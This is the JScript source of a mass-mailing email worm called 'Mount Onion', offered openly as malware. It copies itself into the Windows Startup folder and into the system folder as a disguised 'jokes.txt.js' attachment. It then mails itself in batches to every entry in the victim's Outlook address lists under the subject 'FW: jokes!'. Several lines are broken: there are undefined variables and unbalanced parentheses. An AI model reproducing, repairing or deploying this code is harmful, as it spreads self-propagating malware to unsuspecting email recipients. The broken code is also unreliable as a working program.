{
// Mount Onion
// A retarted JS worm.
var fso,shell,src,ReadMe,StartUpWriter,AttachmentWriter,AppOut,mapi,i,y,x;
shell = WScript.CreateObject("WScript.Shell");
fso = new ActiveXObject("Scripting.FileSystemObject");
AppOut= WScript.CreateObject("Outlook.Application");
mapi=AppOut.GetNamespace("MAPI");
ReadMe=fso.OpenTextFile(WScript.ScriptFullName,1);
ReadMe=Yet.ReadAll();
ReadMe.close();
StartUpWriter=fso.CreateTextFile(shell.SpecialFolders("Startup")+"\\WinBoot.js",true);
StartUpWriter.Write (src);
StartUpWriter.Close();
AttachmentWriter=fso.CreateTextFile(fso.getspecialfolder(1))+"\\jokes.txt.js",true);
AttachmentWriter.Write (src);
AttachmentWriter.Close();
i=0;
for(y=1;y<=mapi.AddressLists.Count;y++){
         for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++){
                  if (i==15){
                           mailer.Send
                           i=0;}
                  if (i==0){
                           mailer=outlook.CreateItem(0);
                           mailer.Subject="FW: jokes!";
                           mailer.Body = "These are some good party jokes";
                           mailer.Attachments.Add(fso.getspecialfolder(1))+"\\jokes.txt.js");}
                  mailer.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
                  i++;
         }
}
if (i!=0) mailer.Send
}